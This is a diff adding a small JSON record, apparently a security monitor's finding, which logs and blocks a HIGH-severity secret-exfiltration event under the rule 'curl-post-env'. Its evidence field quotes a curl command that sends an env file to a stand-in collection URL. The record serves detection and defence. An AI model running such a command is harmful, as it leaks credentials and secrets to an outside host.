@@ -1,0 +1,9 @@
+{
+  "severity": "HIGH",
+  "category": "secret_exfiltration",
+  "ruleId": "curl-post-env",
+  "action": "block",
+  "title": "curl posted an env file",
+  "evidence": "curl https://example.com/collect",
+  "id": "sess-1:3"
+}
